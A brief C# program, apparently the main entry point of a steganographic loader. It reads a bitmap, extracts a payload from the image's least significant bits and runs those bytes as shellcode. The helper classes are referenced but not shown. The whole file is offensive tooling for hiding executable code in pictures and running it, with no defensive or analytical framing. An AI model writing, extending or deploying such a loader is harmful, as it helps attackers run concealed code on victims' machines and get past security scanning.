using System.Drawing;

using Reader.Algorithms;
using Reader.ImageSources;
using Reader.Payloads;

namespace Reader
{
    class Reader
    {
        static byte[] payload_data;

        static Bitmap bm;


        static IImageSource img  = new ImageFile();
        static IAlgorithm   alg  = new LSBM();
        static IPayload     pld  = new Shellcode();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_size = int.Parse(args[0]);
                payload_data = new byte[payload_size];

                bm = img.load(args[1]);
                alg.read(bm, payload_data);
                pld.run(payload_data);
            }
        }
    }
}
